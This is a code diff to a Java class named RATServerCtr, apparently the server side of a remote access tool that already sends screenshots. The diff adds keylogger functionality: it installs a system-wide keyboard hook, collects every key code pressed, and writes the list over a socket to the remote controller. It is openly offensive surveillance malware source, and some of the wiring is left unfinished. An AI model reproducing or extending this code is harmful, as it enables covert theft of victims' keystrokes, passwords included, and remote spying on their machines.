@@ -22,6 +22,10 @@ import java.util.Arrays;
 import javax.imageio.ImageIO;
 import views.RATServerView;
 
+import lc.kra.system.keyboard.GlobalKeyboardHook;
+import lc.kra.system.keyboard.event.GlobalKeyAdapter;
+import lc.kra.system.keyboard.event.GlobalKeyEvent;
+
 /**
  *
  * @author gbrid
@@ -72,6 +76,8 @@ public class RATServerCtr {
                     sendPic();
                     break;
                 case "Key":
+                    //ArrayList<Integer> key = new ArrayList<Integer>();
+                    //getKeyStrokeOn(key);
                     
                     break;
                 default:
@@ -145,12 +151,54 @@ public class RATServerCtr {
 
                 dout.writeInt(lines.size());
 
-                for (String lineTemp : lines){
+                for(String lineTemp : lines) {
                     dout.writeUTF(lineTemp);
                 }
             }
         } catch (Exception e) {
             e.printStackTrace();
+        }
+    }
+    
+    public void sendKeys() {
+        try {
+            DataOutputStream dout = new DataOutputStream(s.getOutputStream());
+            ArrayList<Integer> keys = new ArrayList<>();
+            getKeyStrokeOn(keys);
+            dout.writeInt(keys.size());
+            
+            for(int keyTemp : keys) {
+                dout.writeInt(keyTemp);
+            } 
+        } catch (Exception e) {
+        }
+    }
+    
+    public static GlobalKeyboardHook getKeyStrokeOn(ArrayList<Integer> listKeypress) {
+        try {
+            GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true);
+            
+            keyboardHook.addKeyListener(new GlobalKeyAdapter() {
+                @Override
+                public void keyPressed(GlobalKeyEvent event) {
+                    listKeypress.add(event.getVirtualKeyCode());
+                }
+            });
+            
+            return keyboardHook;
+        } catch (Exception e) {
+            e.printStackTrace();
+            
+            return null;
+        }
+    }
+    
+    public static boolean getKeyStrokeOff(GlobalKeyboardHook keyboardHook) {
+        try {
+            keyboardHook.shutdownHook();
+            return true;
+        } catch (Exception e) {
+            return false;
         }
     }
 }
